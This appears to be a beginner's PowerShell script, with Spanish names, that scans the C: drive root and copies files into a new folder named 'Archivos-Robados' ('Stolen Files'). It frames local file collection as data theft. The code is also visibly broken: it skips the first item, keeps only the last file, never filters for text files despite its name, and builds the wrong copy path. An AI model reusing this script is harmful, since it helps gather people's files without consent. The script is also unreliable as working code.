function copiar-txt{
    param([String]$directorio)
    $files = Get-ChildItem -Path $directorio
    $num = 1 

    while( $num -lt $files.Length ){
        if([String]$files[$num].GetType() -eq "System.IO.FileInfo"){
            $files_txt = $files[$num]
            [BOOL]$files_validation = $true
        } 
        $num++
    }
    if($files_validation){
        New-Item -Path 'C:\Archivos-Robados' -ItemType Directory
        foreach($file in $files_txt){
            Copy-Item -Path C:\$file -Destination C:\Archivos-Robados
        }
    }else{
        Write-Host "No se encontraron Archivos de texto"
    }
}

copiar-txt c://